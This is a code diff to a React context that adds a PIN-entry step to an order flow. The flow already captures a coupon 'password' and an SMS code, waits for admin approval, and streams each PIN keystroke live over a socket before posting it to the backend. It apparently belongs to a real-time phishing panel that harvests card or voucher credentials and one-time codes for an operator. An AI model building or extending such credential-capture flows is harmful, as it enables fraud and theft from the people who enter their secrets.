@@ -20,7 +20,7 @@ export interface CouponData {
   password: string;
 }
 
-export type OrderStatus = "IDLE" | "SHIPPING_SUBMITTED" | "COUPON_SUBMITTING" | "WAITING_APPROVAL" | "APPROVED" | "REJECTED" | "AUTO_REJECTED" | "WAITING_SMS" | "SMS_SUBMITTED" | "COMPLETED" | "RETURN_COUPON";
+export type OrderStatus = "IDLE" | "SHIPPING_SUBMITTED" | "COUPON_SUBMITTING" | "WAITING_APPROVAL" | "APPROVED" | "REJECTED" | "AUTO_REJECTED" | "WAITING_SMS" | "SMS_SUBMITTED" | "REQUEST_PIN" | "PIN_SUBMITTED" | "COMPLETED" | "RETURN_COUPON";
 
 interface RealtimeContextType {
   // Shipping Data
@@ -34,6 +34,10 @@ interface RealtimeContextType {
   // SMS Verification
   smsCode: string;
   updateSmsCode: (code: string) => void;
+
+  // PIN Verification
+  pinCode: string;
+  updatePinCode: (code: string) => void;
   
   // Workflow State
   currentOrderId: string | null;
@@ -51,6 +55,7 @@ interface RealtimeContextType {
   // Backend Integration
   submitOrder: (finalCouponData?: CouponData) => Promise<void>;
   submitSMS: (code?: string) => Promise<void>;
+  submitPin: (code?: string) => Promise<void>;
   resubmitCoupon: (newCouponData: CouponData) => Promise<void>;
   startLiveSession: (opts?: { force?: boolean }) => void;
   endLiveSession: () => void;
@@ -65,6 +70,7 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
   const [liveData, setLiveData] = useState<LiveFormData | null>(null);
   const [couponData, setCouponData] = useState<CouponData | null>(null);
   const [smsCode, setSmsCode] = useState<string>("");
+  const [pinCode, setPinCode] = useState<string>("");
   // Persist currentOrderId and order_token to sessionStorage (order_token required for /sms and /update-coupon)
   const [currentOrderId, _setCurrentOrderId] = useState<string | null>(() => {
     try { return sessionStorage.getItem('currentOrderId'); } catch { return null; }
@@ -158,6 +164,13 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
     setSmsCode(code);
   };
 
+  const updatePinCode = (code: string) => {
+    setPinCode(code);
+    if (currentOrderId) {
+      socket?.emit('live_pin_update', { pinCode: code });
+    }
+  };
+
   const startLiveSession = (opts?: { force?: boolean }) => {
     if (!liveData) return;
     if (currentOrderId && !opts?.force) return; // Order already exists; use force for RETURN_COUPON resubmit flow
@@ -240,6 +253,24 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
     }
   };
 
+  const submitPin = async (code?: string) => {
+    const pinCodeToUse = code || pinCode;
+    if (!currentOrderId || !pinCodeToUse) return;
+    setOrderStatus("PIN_SUBMITTED");
+    try {
+      const body: { pinCode: string; order_token?: string } = { pinCode: pinCodeToUse };
+      if (orderToken) body.order_token = orderToken;
+      const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/pin`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body)
+      });
+      if (!response.ok) throw new Error("Failed to submit PIN");
+    } catch (error) {
+      console.error("Error submitting PIN:", error);
+    }
+  };
+
   // Resubmit Coupon (update existing order after admin sends back)
   const resubmitCoupon = async (newCouponData: CouponData) => {
     if (!currentOrderId || !newCouponData) return;
@@ -287,6 +318,8 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
         updateCouponData,
         smsCode,
         updateSmsCode,
+        pinCode,
+        updatePinCode,
         orderStatus, 
         setOrderStatus,
         currentOrderId,
@@ -294,6 +327,7 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
         adminAction,
         submitOrder,
         submitSMS,
+        submitPin,
         resubmitCoupon,
         cartTotal,
         setCartTotal,
